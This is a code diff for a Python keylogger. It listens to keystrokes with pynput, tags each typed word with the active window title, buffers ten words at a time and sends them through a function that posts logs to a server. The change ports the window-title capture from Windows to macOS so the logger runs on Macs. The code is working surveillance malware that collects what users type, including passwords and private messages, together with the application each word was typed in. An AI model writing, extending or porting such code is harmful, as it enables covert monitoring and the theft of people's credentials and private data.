@@ -4,7 +4,12 @@ from pynput.keyboard import Key, Listener
 import os
 import threading
 import time
-from win32gui import GetWindowText, GetForegroundWindow
+import platform
+
+# macOS-specific imports
+if platform.system() == 'Darwin':
+    from AppKit import NSWorkspace
+    import Quartz
 
 # Configuring the logger to also log to console for debugging
 logging.basicConfig(
@@ -27,6 +32,16 @@ word_buffer = []
 buffer_size = 10  # Send after every 10 words
 context_buffer = []
 
+# Function to get the active window title on macOS
+def get_active_window_title():
+    try:
+        active_app = NSWorkspace.sharedWorkspace().activeApplication()
+        window_title = active_app['NSApplicationName']
+        return window_title
+    except Exception as e:
+        logging.error(f"Error getting active window title: {e}")
+        return "Unknown Window"
+
 # Send logs to the server
 def send_logs(data):
     try:
@@ -45,7 +60,7 @@ def send_logs(data):
 def on_word_completed(word):
     global word_buffer
     try:
-        active_window = GetWindowText(GetForegroundWindow())  # Get active window title
+        active_window = get_active_window_title()  # Get active window title on macOS
         word_with_context = f"{active_window}: {word}\n"
         word_buffer.append(word_with_context)
         logging.info(f"Word logged: {word_with_context}")
